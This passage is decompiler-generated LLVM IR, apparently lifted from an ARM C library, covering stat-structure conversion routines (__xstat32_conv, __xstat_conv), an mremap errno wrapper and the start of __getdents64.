  store i32 %v1_1c58c, i32* %r3.global-to-local, align 4
  %v1_1c590 = add i32 %v0_1c58c, 48
  store i32 %v1_1c590, i32* %r7.global-to-local, align 4
  %v1_1c594 = inttoptr i32 %v1_1c590 to i32*
  %v2_1c594 = load i32, i32* %v1_1c594, align 4
  store i32 %v2_1c594, i32* %r7.global-to-local, align 4
  %v3_1c594 = add i32 %v0_1c58c, 52
  %v4_1c594 = inttoptr i32 %v3_1c594 to i32*
  %v5_1c594 = load i32, i32* %v4_1c594, align 4
  store i32 %v5_1c594, i32* %r8.global-to-local, align 4
  %v1_1c598 = inttoptr i32 %v1_1c58c to i32*
  %v2_1c598 = load i32, i32* %v1_1c598, align 4
  %v3_1c598 = add i32 %v0_1c58c, 84
  %v4_1c598 = inttoptr i32 %v3_1c598 to i32*
  %v5_1c598 = load i32, i32* %v4_1c598, align 4
  store i32 %v5_1c598, i32* %r1.global-to-local, align 4
  %v1_1c59c = add i32 %v0_1c58c, 16
  %v2_1c59c = inttoptr i32 %v1_1c59c to i32*
  %v3_1c59c = load i32, i32* %v2_1c59c, align 4
  store i32 %v3_1c59c, i32* %r2.global-to-local, align 4
  %v0_1c5a0 = load i32, i32* %r5.global-to-local, align 4
  %v1_1c5a0 = add i32 %v0_1c5a0, 80
  %v1_1c5a4 = inttoptr i32 %v1_1c5a0 to i32*
  store i32 %v2_1c598, i32* %v1_1c5a4, align 4
  %v3_1c5a4 = add i32 %v0_1c5a0, 84
  %v4_1c5a4 = inttoptr i32 %v3_1c5a4 to i32*
  %v5_1c5a4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1c5a4, i32* %v4_1c5a4, align 4
  %v0_1c5a8 = load i32, i32* %r7.global-to-local, align 4
  %v1_1c5a8 = load i32, i32* %r5.global-to-local, align 4
  %v2_1c5a8 = add i32 %v1_1c5a8, 48
  %v3_1c5a8 = inttoptr i32 %v2_1c5a8 to i32*
  store i32 %v0_1c5a8, i32* %v3_1c5a8, align 4
  %v0_1c5ac = load i32, i32* %r8.global-to-local, align 4
  %v1_1c5ac = load i32, i32* %r5.global-to-local, align 4
  %v2_1c5ac = add i32 %v1_1c5ac, 52
  %v3_1c5ac = inttoptr i32 %v2_1c5ac to i32*
  store i32 %v0_1c5ac, i32* %v3_1c5ac, align 4
  %v0_1c5b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_1c5b0 = load i32, i32* %r5.global-to-local, align 4
  %v2_1c5b0 = add i32 %v1_1c5b0, 16
  %v3_1c5b0 = inttoptr i32 %v2_1c5b0 to i32*
  store i32 %v0_1c5b0, i32* %v3_1c5b0, align 4
  %v0_1c5b4 = load i32, i32* %r6.global-to-local, align 4
  %v1_1c5b4 = add i32 %v0_1c5b4, 88
  store i32 %v1_1c5b4, i32* %r3.global-to-local, align 4
  %v1_1c5b8 = add i32 %v0_1c5b4, 20
  %v2_1c5b8 = inttoptr i32 %v1_1c5b8 to i32*
  %v3_1c5b8 = load i32, i32* %v2_1c5b8, align 4
  store i32 %v3_1c5b8, i32* %r2.global-to-local, align 4
  %v1_1c5bc = inttoptr i32 %v1_1c5b4 to i32*
  %v2_1c5bc = load i32, i32* %v1_1c5bc, align 4
  %v3_1c5bc = add i32 %v0_1c5b4, 92
  %v4_1c5bc = inttoptr i32 %v3_1c5bc to i32*
  %v5_1c5bc = load i32, i32* %v4_1c5bc, align 4
  store i32 %v5_1c5bc, i32* %r1.global-to-local, align 4
  %v1_1c5c0 = add i32 %v0_1c5b4, 64
  store i32 %v1_1c5c0, i32* %r6.global-to-local, align 4
  %v1_1c5c4 = inttoptr i32 %v1_1c5c0 to i32*
  %v2_1c5c4 = load i32, i32* %v1_1c5c4, align 4
  store i32 %v2_1c5c4, i32* %r6.global-to-local, align 4
  %v3_1c5c4 = add i32 %v0_1c5b4, 68
  %v4_1c5c4 = inttoptr i32 %v3_1c5c4 to i32*
  %v5_1c5c4 = load i32, i32* %v4_1c5c4, align 4
  store i32 %v5_1c5c4, i32* %r7.global-to-local, align 4
  %v0_1c5c8 = load i32, i32* %r5.global-to-local, align 4
  %v1_1c5c8 = add i32 %v0_1c5c8, 88
  store i32 %v1_1c5c8, i32* %r3.global-to-local, align 4
  %v2_1c5cc = add i32 %v0_1c5c8, 20
  %v3_1c5cc = inttoptr i32 %v2_1c5cc to i32*
  store i32 %v3_1c5b8, i32* %v3_1c5cc, align 4
  %v0_1c5d0 = load i32, i32* %ip.global-to-local, align 4
  %v1_1c5d0 = load i32, i32* %r5.global-to-local, align 4
  %v2_1c5d0 = add i32 %v1_1c5d0, 24
  %v3_1c5d0 = inttoptr i32 %v2_1c5d0 to i32*
  store i32 %v0_1c5d0, i32* %v3_1c5d0, align 4
  %v0_1c5d4 = load i32, i32* %lr.global-to-local, align 4
  %v1_1c5d4 = load i32, i32* %r5.global-to-local, align 4
  %v2_1c5d4 = add i32 %v1_1c5d4, 28
  %v3_1c5d4 = inttoptr i32 %v2_1c5d4 to i32*
  store i32 %v0_1c5d4, i32* %v3_1c5d4, align 4
  %v0_1c5d8 = load i32, i32* %r6.global-to-local, align 4
  %v1_1c5d8 = load i32, i32* %r5.global-to-local, align 4
  %v2_1c5d8 = add i32 %v1_1c5d8, 64
  %v3_1c5d8 = inttoptr i32 %v2_1c5d8 to i32*
  store i32 %v0_1c5d8, i32* %v3_1c5d8, align 4
  %v0_1c5dc = load i32, i32* %r7.global-to-local, align 4
  %v1_1c5dc = load i32, i32* %r5.global-to-local, align 4
  %v2_1c5dc = add i32 %v1_1c5dc, 68
  %v3_1c5dc = inttoptr i32 %v2_1c5dc to i32*
  store i32 %v0_1c5dc, i32* %v3_1c5dc, align 4
  %v0_1c5e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_1c5e0 = inttoptr i32 %v0_1c5e0 to i32*
  store i32 %v2_1c5bc, i32* %v1_1c5e0, align 4
  %v3_1c5e0 = add i32 %v0_1c5e0, 4
  %v4_1c5e0 = inttoptr i32 %v3_1c5e0 to i32*
  %v5_1c5e0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1c5e0, i32* %v4_1c5e0, align 4
  %v2_1c5e4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1c5e4, i32* %r4.global-to-local, align 4
  ret i32 %v2_1c5bc

; uselistorder directives
  uselistorder i32 %v0_1c5b4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_1c58c, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 100, { 2, 0, 1, 3 }
  uselistorder i32 104, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat32_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_1c5ec = load i32, i32* @r4, align 4
  store i32 %v3_1c5ec, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* @r2, align 4
  %v2_1c604 = inttoptr i32 %arg2 to i8*
  %v3_1c604 = call i32 @__GI_memset(i8* %v2_1c604, i32 0)
  %v2_1c608 = load i32, i32* %arg1, align 4
  %v3_1c608 = add i32 %tmp, 4
  %v4_1c608 = inttoptr i32 %v3_1c608 to i32*
  %v5_1c608 = load i32, i32* %v4_1c608, align 4
  store i32 %v5_1c608, i32* %r4.global-to-local, align 4
  %v0_1c60c = load i32, i32* %r6.global-to-local, align 4
  %v1_1c60c = inttoptr i32 %v0_1c60c to i32*
  store i32 %v2_1c608, i32* %v1_1c60c, align 4
  %v3_1c60c = add i32 %v0_1c60c, 4
  %v4_1c60c = inttoptr i32 %v3_1c60c to i32*
  %v5_1c60c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1c60c, i32* %v4_1c60c, align 4
  %v0_1c610 = load i32, i32* %r5.global-to-local, align 4
  %v1_1c610 = add i32 %v0_1c610, 32
  %v1_1c614 = inttoptr i32 %v1_1c610 to i32*
  %v2_1c614 = load i32, i32* %v1_1c614, align 4
  %v3_1c614 = add i32 %v0_1c610, 36
  %v4_1c614 = inttoptr i32 %v3_1c614 to i32*
  %v5_1c614 = load i32, i32* %v4_1c614, align 4
  store i32 %v5_1c614, i32* %r4.global-to-local, align 4
  %v1_1c618 = add i32 %v0_1c610, 96
  %v2_1c618 = inttoptr i32 %v1_1c618 to i32*
  %v3_1c618 = load i32, i32* %v2_1c618, align 4
  store i32 %v3_1c618, i32* %r2.global-to-local, align 4
  %v1_1c61c = load i32, i32* %r6.global-to-local, align 4
  %v2_1c61c = add i32 %v1_1c61c, 32
  %v3_1c61c = inttoptr i32 %v2_1c61c to i32*
  store i32 %v2_1c614, i32* %v3_1c61c, align 4
  %v0_1c620 = load i32, i32* %r4.global-to-local, align 4
  %v1_1c620 = load i32, i32* %r6.global-to-local, align 4
  %v2_1c620 = add i32 %v1_1c620, 36
  %v3_1c620 = inttoptr i32 %v2_1c620 to i32*
  store i32 %v0_1c620, i32* %v3_1c620, align 4
  %v0_1c624 = load i32, i32* %r2.global-to-local, align 4
  %v1_1c624 = load i32, i32* %r6.global-to-local, align 4
  %v2_1c624 = add i32 %v1_1c624, 12
  %v3_1c624 = inttoptr i32 %v2_1c624 to i32*
  store i32 %v0_1c624, i32* %v3_1c624, align 4
  %v0_1c628 = load i32, i32* %r5.global-to-local, align 4
  %v1_1c628 = add i32 %v0_1c628, 48
  %v2_1c628 = inttoptr i32 %v1_1c628 to i32*
  %v3_1c628 = load i32, i32* %v2_1c628, align 4
  %v1_1c62c = add i32 %v0_1c628, 24
  store i32 %v1_1c62c, i32* %ip.global-to-local, align 4
  %v1_1c630 = inttoptr i32 %v1_1c62c to i32*
  %v2_1c630 = load i32, i32* %v1_1c630, align 4
  store i32 %v2_1c630, i32* %ip.global-to-local, align 4
  %v3_1c630 = add i32 %v0_1c628, 28
  %v4_1c630 = inttoptr i32 %v3_1c630 to i32*
  %v5_1c630 = load i32, i32* %v4_1c630, align 4
  store i32 %v5_1c630, i32* %lr.global-to-local, align 4
  %v1_1c634 = load i32, i32* %r6.global-to-local, align 4
  %v2_1c634 = add i32 %v1_1c634, 44
  %v3_1c634 = inttoptr i32 %v2_1c634 to i32*
  store i32 %v3_1c628, i32* %v3_1c634, align 4
  %v0_1c638 = load i32, i32* %r5.global-to-local, align 4
  %v1_1c638 = add i32 %v0_1c638, 64
  %v2_1c638 = inttoptr i32 %v1_1c638 to i32*
  %v3_1c638 = load i32, i32* %v2_1c638, align 4
  %v1_1c63c = add i32 %v0_1c638, 56
  %v2_1c63c = inttoptr i32 %v1_1c63c to i32*
  %v3_1c63c = load i32, i32* %v2_1c63c, align 4
  store i32 %v3_1c63c, i32* %r2.global-to-local, align 4
  %v1_1c640 = load i32, i32* %r6.global-to-local, align 4
  %v2_1c640 = add i32 %v1_1c640, 52
  %v3_1c640 = inttoptr i32 %v2_1c640 to i32*
  store i32 %v3_1c638, i32* %v3_1c640, align 4
  %v0_1c644 = load i32, i32* %r2.global-to-local, align 4
  %v1_1c644 = load i32, i32* %r6.global-to-local, align 4
  %v2_1c644 = add i32 %v1_1c644, 48
  %v3_1c644 = inttoptr i32 %v2_1c644 to i32*
  store i32 %v0_1c644, i32* %v3_1c644, align 4
  %v0_1c648 = load i32, i32* %r5.global-to-local, align 4
  %v1_1c648 = add i32 %v0_1c648, 72
  %v1_1c64c = inttoptr i32 %v1_1c648 to i32*
  %v2_1c64c = load i32, i32* %v1_1c64c, align 4
  %v3_1c64c = add i32 %v0_1c648, 76
  %v4_1c64c = inttoptr i32 %v3_1c64c to i32*
  %v5_1c64c = load i32, i32* %v4_1c64c, align 4
  store i32 %v5_1c64c, i32* %r1.global-to-local, align 4
  %v0_1c650 = load i32, i32* %r6.global-to-local, align 4
  %v1_1c650 = add i32 %v0_1c650, 56
  %v1_1c654 = inttoptr i32 %v1_1c650 to i32*
  store i32 %v2_1c64c, i32* %v1_1c654, align 4
  %v3_1c654 = add i32 %v0_1c650, 60
  %v4_1c654 = inttoptr i32 %v3_1c654 to i32*
  %v5_1c654 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1c654, i32* %v4_1c654, align 4
  %v0_1c658 = load i32, i32* %r5.global-to-local, align 4
  %v1_1c658 = add i32 %v0_1c658, 80
  %v1_1c65c = inttoptr i32 %v1_1c658 to i32*
  %v2_1c65c = load i32, i32* %v1_1c65c, align 4
  %v3_1c65c = add i32 %v0_1c658, 84
  %v4_1c65c = inttoptr i32 %v3_1c65c to i32*
  %v5_1c65c = load i32, i32* %v4_1c65c, align 4
  store i32 %v5_1c65c, i32* %r1.global-to-local, align 4
  %v0_1c660 = load i32, i32* %r6.global-to-local, align 4
  %v1_1c660 = add i32 %v0_1c660, 64
  %v1_1c664 = inttoptr i32 %v1_1c660 to i32*
  store i32 %v2_1c65c, i32* %v1_1c664, align 4
  %v3_1c664 = add i32 %v0_1c660, 68
  %v4_1c664 = inttoptr i32 %v3_1c664 to i32*
  %v5_1c664 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1c664, i32* %v4_1c664, align 4
  %v0_1c668 = load i32, i32* %r5.global-to-local, align 4
  %v1_1c668 = add i32 %v0_1c668, 16
  %v2_1c668 = inttoptr i32 %v1_1c668 to i32*
  %v3_1c668 = load i32, i32* %v2_1c668, align 4
  %v1_1c66c = load i32, i32* %r6.global-to-local, align 4
  %v2_1c66c = add i32 %v1_1c66c, 16
  %v3_1c66c = inttoptr i32 %v2_1c66c to i32*
  store i32 %v3_1c668, i32* %v3_1c66c, align 4
  %v0_1c670 = load i32, i32* %r5.global-to-local, align 4
  %v1_1c670 = add i32 %v0_1c670, 88
  %v1_1c674 = add i32 %v0_1c670, 20
  %v2_1c674 = inttoptr i32 %v1_1c674 to i32*
  %v3_1c674 = load i32, i32* %v2_1c674, align 4
  store i32 %v3_1c674, i32* %r2.global-to-local, align 4
  %v1_1c678 = inttoptr i32 %v1_1c670 to i32*
  %v2_1c678 = load i32, i32* %v1_1c678, align 4
  %v3_1c678 = add i32 %v0_1c670, 92
  %v4_1c678 = inttoptr i32 %v3_1c678 to i32*
  %v5_1c678 = load i32, i32* %v4_1c678, align 4
  store i32 %v5_1c678, i32* %r1.global-to-local, align 4
  %v0_1c67c = load i32, i32* %r6.global-to-local, align 4
  %v1_1c67c = add i32 %v0_1c67c, 72
  %v1_1c680 = inttoptr i32 %v1_1c67c to i32*
  store i32 %v2_1c678, i32* %v1_1c680, align 4
  %v3_1c680 = add i32 %v0_1c67c, 76
  %v4_1c680 = inttoptr i32 %v3_1c680 to i32*
  %v5_1c680 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1c680, i32* %v4_1c680, align 4
  %v0_1c684 = load i32, i32* %r2.global-to-local, align 4
  %v1_1c684 = load i32, i32* %r6.global-to-local, align 4
  %v2_1c684 = add i32 %v1_1c684, 20
  %v3_1c684 = inttoptr i32 %v2_1c684 to i32*
  store i32 %v0_1c684, i32* %v3_1c684, align 4
  %v0_1c688 = load i32, i32* %ip.global-to-local, align 4
  %v1_1c688 = load i32, i32* %r6.global-to-local, align 4
  %v2_1c688 = add i32 %v1_1c688, 24
  %v3_1c688 = inttoptr i32 %v2_1c688 to i32*
  store i32 %v0_1c688, i32* %v3_1c688, align 4
  %v0_1c68c = load i32, i32* %lr.global-to-local, align 4
  %v1_1c68c = load i32, i32* %r6.global-to-local, align 4
  %v2_1c68c = add i32 %v1_1c68c, 28
  %v3_1c68c = inttoptr i32 %v2_1c68c to i32*
  store i32 %v0_1c68c, i32* %v3_1c68c, align 4
  %v2_1c690 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1c690, i32* %r4.global-to-local, align 4
  ret i32 %v2_1c678

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 92, { 0, 1, 3, 2 }
  uselistorder i32 84, { 1, 2, 0, 3, 4 }
  uselistorder i32 96, { 2, 3, 4, 6, 7, 0, 1, 5 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* @r2, align 4
  %v2_1c6b4 = inttoptr i32 %arg2 to i8*
  %v3_1c6b4 = call i32 @__GI_memset(i8* %v2_1c6b4, i32 0)
  %v1_1c6b8 = add i32 %tmp, 4
  %v2_1c6b8 = inttoptr i32 %v1_1c6b8 to i32*
  %v3_1c6b8 = load i32, i32* %v2_1c6b8, align 4
  %v2_1c6bc = load i32, i32* %arg1, align 4
  store i32 %v2_1c6bc, i32* %r8.global-to-local, align 4
  %v1_1c6c0 = load i32, i32* %r5.global-to-local, align 4
  %v2_1c6c0 = add i32 %v1_1c6c0, 12
  %v3_1c6c0 = inttoptr i32 %v2_1c6c0 to i32*
  store i32 %v3_1c6b8, i32* %v3_1c6c0, align 4
  %v0_1c6c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_1c6c4 = add i32 %v0_1c6c4, 20
  %v2_1c6c4 = inttoptr i32 %v1_1c6c4 to i32*
  %v3_1c6c4 = load i32, i32* %v2_1c6c4, align 4
  %v1_1c6c8 = add i32 %v0_1c6c4, 16
  %v2_1c6c8 = inttoptr i32 %v1_1c6c8 to i32*
  %v3_1c6c8 = load i32, i32* %v2_1c6c8, align 4
  store i32 %v3_1c6c8, i32* %r6.global-to-local, align 4
  %v1_1c6cc = load i32, i32* %r5.global-to-local, align 4
  %v2_1c6cc = add i32 %v1_1c6cc, 44
  %v3_1c6cc = inttoptr i32 %v2_1c6cc to i32*
  store i32 %v3_1c6c4, i32* %v3_1c6cc, align 4
  %v0_1c6d0 = load i32, i32* %r4.global-to-local, align 4
  %v1_1c6d0 = add i32 %v0_1c6d0, 24
  %v2_1c6d0 = inttoptr i32 %v1_1c6d0 to i32*
  %v3_1c6d0 = load i32, i32* %v2_1c6d0, align 4
  %v1_1c6d4 = load i32, i32* %r5.global-to-local, align 4
  %v2_1c6d4 = add i32 %v1_1c6d4, 48
  %v3_1c6d4 = inttoptr i32 %v2_1c6d4 to i32*
  store i32 %v3_1c6d0, i32* %v3_1c6d4, align 4
  %v0_1c6d8 = load i32, i32* %r4.global-to-local, align 4
  %v1_1c6d8 = add i32 %v0_1c6d8, 28
  %v2_1c6d8 = inttoptr i32 %v1_1c6d8 to i32*
  %v3_1c6d8 = load i32, i32* %v2_1c6d8, align 4
  %v1_1c6dc = load i32, i32* %r5.global-to-local, align 4
  %v2_1c6dc = add i32 %v1_1c6dc, 52
  %v3_1c6dc = inttoptr i32 %v2_1c6dc to i32*
  store i32 %v3_1c6d8, i32* %v3_1c6dc, align 4
  %v0_1c6e0 = load i32, i32* %r4.global-to-local, align 4
  %v1_1c6e0 = add i32 %v0_1c6e0, 32
  %v1_1c6e4 = inttoptr i32 %v1_1c6e0 to i32*
  %v2_1c6e4 = load i32, i32* %v1_1c6e4, align 4
  %v3_1c6e4 = add i32 %v0_1c6e0, 36
  %v4_1c6e4 = inttoptr i32 %v3_1c6e4 to i32*
  %v5_1c6e4 = load i32, i32* %v4_1c6e4, align 4
  store i32 %v5_1c6e4, i32* %r1.global-to-local, align 4
  %v0_1c6e8 = load i32, i32* %r5.global-to-local, align 4
  %v1_1c6e8 = add i32 %v0_1c6e8, 56
  %v1_1c6ec = inttoptr i32 %v1_1c6e8 to i32*
  store i32 %v2_1c6e4, i32* %v1_1c6ec, align 4
  %v3_1c6ec = add i32 %v0_1c6e8, 60
  %v4_1c6ec = inttoptr i32 %v3_1c6ec to i32*
  %v5_1c6ec = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1c6ec, i32* %v4_1c6ec, align 4
  %v0_1c6f0 = load i32, i32* %r4.global-to-local, align 4
  %v1_1c6f0 = add i32 %v0_1c6f0, 40
  %v1_1c6f4 = inttoptr i32 %v1_1c6f0 to i32*
  %v2_1c6f4 = load i32, i32* %v1_1c6f4, align 4
  %v3_1c6f4 = add i32 %v0_1c6f0, 44
  %v4_1c6f4 = inttoptr i32 %v3_1c6f4 to i32*
  %v5_1c6f4 = load i32, i32* %v4_1c6f4, align 4
  store i32 %v5_1c6f4, i32* %r1.global-to-local, align 4
  %v0_1c6f8 = load i32, i32* %r5.global-to-local, align 4
  %v1_1c6f8 = add i32 %v0_1c6f8, 64
  %v1_1c6fc = inttoptr i32 %v1_1c6f8 to i32*
  store i32 %v2_1c6f4, i32* %v1_1c6fc, align 4
  %v3_1c6fc = add i32 %v0_1c6f8, 68
  %v4_1c6fc = inttoptr i32 %v3_1c6fc to i32*
  %v5_1c6fc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1c6fc, i32* %v4_1c6fc, align 4
  %v0_1c700 = load i32, i32* %r4.global-to-local, align 4
  %v1_1c700 = add i32 %v0_1c700, 48
  %v1_1c704 = inttoptr i32 %v1_1c700 to i32*
  %v2_1c704 = load i32, i32* %v1_1c704, align 4
  %v3_1c704 = add i32 %v0_1c700, 52
  %v4_1c704 = inttoptr i32 %v3_1c704 to i32*
  %v5_1c704 = load i32, i32* %v4_1c704, align 4
  store i32 %v5_1c704, i32* %r1.global-to-local, align 4
  %v1_1c708 = add i32 %v0_1c700, 8
  %v2_1c708 = inttoptr i32 %v1_1c708 to i16*
  %v3_1c708 = load i16, i16* %v2_1c708, align 2
  %v4_1c708 = zext i16 %v3_1c708 to i32
  store i32 %v4_1c708, i32* %r2.global-to-local, align 4
  %v1_1c70c = add i32 %v0_1c700, 10
  %v2_1c70c = inttoptr i32 %v1_1c70c to i16*
  %v3_1c70c = load i16, i16* %v2_1c70c, align 2
  %v4_1c70c = zext i16 %v3_1c70c to i32
  store i32 %v4_1c70c, i32* %ip.global-to-local, align 4
  %v1_1c710 = add i32 %v0_1c700, 12
  %v2_1c710 = inttoptr i32 %v1_1c710 to i16*
  %v3_1c710 = load i16, i16* %v2_1c710, align 2
  %v4_1c710 = zext i16 %v3_1c710 to i32
  store i32 %v4_1c710, i32* %lr.global-to-local, align 4
  %v1_1c714 = add i32 %v0_1c700, 14
  %v2_1c714 = inttoptr i32 %v1_1c714 to i16*
  %v3_1c714 = load i16, i16* %v2_1c714, align 2
  %v4_1c714 = zext i16 %v3_1c714 to i32
  store i32 %v4_1c714, i32* %r4.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_1c720 = load i32, i32* %r5.global-to-local, align 4
  %v1_1c720 = add i32 %v0_1c720, 72
  %v1_1c724 = inttoptr i32 %v1_1c720 to i32*
  store i32 %v2_1c704, i32* %v1_1c724, align 4
  %v3_1c724 = add i32 %v0_1c720, 76
  %v4_1c724 = inttoptr i32 %v3_1c724 to i32*
  %v5_1c724 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1c724, i32* %v4_1c724, align 4
  %v0_1c728 = load i32, i32* %r5.global-to-local, align 4
  %v1_1c728 = inttoptr i32 %v0_1c728 to i32*
  %v2_1c728 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v2_1c728, i32* %v1_1c728, align 4
  %v3_1c728 = add i32 %v0_1c728, 4
  %v4_1c728 = inttoptr i32 %v3_1c728 to i32*
  %v5_1c728 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v5_1c728, i32* %v4_1c728, align 4
  %v0_1c72c = load i32, i32* %r6.global-to-local, align 4
  %v1_1c72c = load i32, i32* %r5.global-to-local, align 4
  %v2_1c72c = add i32 %v1_1c72c, 32
  %v3_1c72c = inttoptr i32 %v2_1c72c to i32*
  store i32 %v0_1c72c, i32* %v3_1c72c, align 4
  %v0_1c730 = load i32, i32* %r7.global-to-local, align 4
  %v1_1c730 = load i32, i32* %r5.global-to-local, align 4
  %v2_1c730 = add i32 %v1_1c730, 36
  %v3_1c730 = inttoptr i32 %v2_1c730 to i32*
  store i32 %v0_1c730, i32* %v3_1c730, align 4
  %v0_1c734 = load i32, i32* %r2.global-to-local, align 4
  %v1_1c734 = load i32, i32* %r5.global-to-local, align 4
  %v2_1c734 = add i32 %v1_1c734, 16
  %v3_1c734 = inttoptr i32 %v2_1c734 to i32*
  store i32 %v0_1c734, i32* %v3_1c734, align 4
  %v0_1c738 = load i32, i32* %ip.global-to-local, align 4
  %v1_1c738 = load i32, i32* %r5.global-to-local, align 4
  %v2_1c738 = add i32 %v1_1c738, 20
  %v3_1c738 = inttoptr i32 %v2_1c738 to i32*
  store i32 %v0_1c738, i32* %v3_1c738, align 4
  %v0_1c73c = load i32, i32* %lr.global-to-local, align 4
  %v1_1c73c = load i32, i32* %r5.global-to-local, align 4
  %v2_1c73c = add i32 %v1_1c73c, 24
  %v3_1c73c = inttoptr i32 %v2_1c73c to i32*
  store i32 %v0_1c73c, i32* %v3_1c73c, align 4
  %v0_1c740 = load i32, i32* %r4.global-to-local, align 4
  %v1_1c740 = load i32, i32* %r5.global-to-local, align 4
  %v2_1c740 = add i32 %v1_1c740, 28
  %v3_1c740 = inttoptr i32 %v2_1c740 to i32*
  store i32 %v0_1c740, i32* %v3_1c740, align 4
  ret i32 %v2_1c704

; uselistorder directives
  uselistorder i32 %v0_1c700, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 76, { 2, 3, 4, 5, 1, 6, 7, 8, 9, 11, 0, 12, 10 }
  uselistorder i32 72, { 6, 1, 2, 3, 4, 0, 9, 7, 8, 5 }
  uselistorder i32 68, { 1, 2, 5, 3, 0, 4, 6 }
  uselistorder i32 60, { 2, 3, 1, 4, 0, 5, 6 }
  uselistorder i32 88, { 7, 2, 3, 4, 5, 0, 1, 6 }
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1c784, label %dec_label_pc_1c774

dec_label_pc_1c774:                               ; preds = %entry
  %v0_1c774 = call i32 @__GI___errno_location()
  %v0_1c778 = load i32, i32* %r4.global-to-local, align 4
  %v1_1c778 = sub i32 0, %v0_1c778
  %v2_1c77c = inttoptr i32 %v0_1c774 to i32*
  store i32 %v1_1c778, i32* %v2_1c77c, align 4
  br label %dec_label_pc_1c784

dec_label_pc_1c784:                               ; preds = %entry, %dec_label_pc_1c774
  %v1_1c78c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_1c774 ]
  ret i32 %v1_1c78c

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1c784, { 1, 0 }
}

define i32 @__getdents64(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_1c794 = load i32, i32* @r4, align 4
  %v6_1c794 = load i32, i32* @r5, align 4
  %v12_1c794 = load i32, i32* @r7, align 4
  %v1_1c798 = add i32 %arg3, 14
  %v2_1c7a0 = ptrtoint i32* %stack_var_-72 to i32
  %v1_1c7a4 = and i32 %v1_1c798, -8
  %v2_1c7a8 = sub i32 %v2_1c7a0, %v1_1c7a4
  %v1_1c7ac = add i32 %v2_1c7a8, 8
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %v1_1c7ac, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp25 = icmp ult i32 %arg1, -4095
  br i1 %tmp25, label %dec_label_pc_1c7e8, label %dec_label_pc_1c7d4

dec_label_pc_1c7d4:                               ; preds = %entry
  %v0_1c7d4 = call i32 @__GI___errno_location()
  %v0_1c7d8 = load i32, i32* %r4.global-to-local, align 4
